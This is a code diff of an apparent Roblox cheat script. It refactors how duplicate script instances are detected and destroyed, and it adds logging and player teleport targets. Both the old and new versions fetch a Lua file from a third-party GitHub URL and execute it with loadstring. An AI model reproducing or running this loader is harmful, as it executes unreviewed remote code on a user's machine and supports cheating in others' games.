@@ -8,43 +8,69 @@ local HttpService = game:GetService("HttpService")
 local Lighting = game:GetService("Lighting")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- Load external command script
-pcall(function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/NeuronerX/verysigma2/refs/heads/main/command.lua'))()
-end)
-
+-- ENHANCED SCRIPT DUPLICATION PREVENTION
 local LP = Players.LocalPlayer
-local PlaceId = game.PlaceId
+local scriptIdentifier = "EnhancedScriptV3_" .. LP.Name .. "_" .. game.JobId
 
--- PREVENT SCRIPT DUPLICATION
-local scriptIdentifier = "EnhancedScriptV2_" .. LP.Name
-if _G[scriptIdentifier] then
-    _G[scriptIdentifier]:Destroy()
-    wait(1) -- Give time for cleanup
+-- Kill ALL existing instances more aggressively
+for key, value in pairs(_G) do
+    if type(key) == "string" and (key:find("EnhancedScript") or key:find("ScriptController")) then
+        if type(value) == "table" and value.Destroy then
+            pcall(function()
+                value:Destroy()
+            end)
+        end
+        _G[key] = nil
+    end
 end
 
+-- Wait for cleanup
+task.wait(0.5)
+
+-- Check if already running
+if _G[scriptIdentifier] then
+    warn("Script already running for this user in this server!")
+    return
+end
+
+-- Load external command script ONCE
+local externalScriptLoaded = false
+pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/NeuronerX/verysigma2/refs/heads/main/command.lua'))()
+    externalScriptLoaded = true
+end)
+
+local PlaceId = game.PlaceId
+
+-- ENHANCED SCRIPT CONTROLLER
 local ScriptController = {}
 ScriptController.__index = ScriptController
 
 function ScriptController:Destroy()
     self.active = false
+    print("Destroying script instance for " .. LP.Name)
+    
     -- Cleanup all connections
-    for _, connection in pairs(self.connections) do
+    for i, connection in ipairs(self.connections) do
         if connection then
-            -- Handle RBXScriptConnection objects
-            if type(connection) == "userdata" and connection.Connected then
-                connection:Disconnect()
-            -- Handle task.spawn coroutines
-            elseif type(connection) == "thread" then
-                task.cancel(connection)
-            -- Handle any other cleanup function
-            elseif type(connection) == "function" then
-                pcall(connection)
-            end
+            pcall(function()
+                -- Handle RBXScriptConnection objects
+                if type(connection) == "userdata" and connection.Connected then
+                    connection:Disconnect()
+                -- Handle task.spawn coroutines
+                elseif type(connection) == "thread" then
+                    task.cancel(connection)
+                -- Handle any other cleanup function
+                elseif type(connection) == "function" then
+                    connection()
+                end
+            end)
         end
     end
+    
     self.connections = {}
     _G[scriptIdentifier] = nil
+    print("Script cleanup completed for " .. LP.Name)
 end
 
 function ScriptController.new()
@@ -53,9 +79,9 @@ function ScriptController.new()
     self.connections = {}
     return self
 end
-
+-- Create singleton instance
 _G[scriptIdentifier] = ScriptController.new()
-
+print("Script initialized for " .. LP.Name .. " in JobId: " .. game.JobId)
 -- CENTRALIZED TELEPORT TARGETS
 local teleportTargets = {
     ["Cubot_Nova3"]     = CFrame.new(7152,4405,4707),
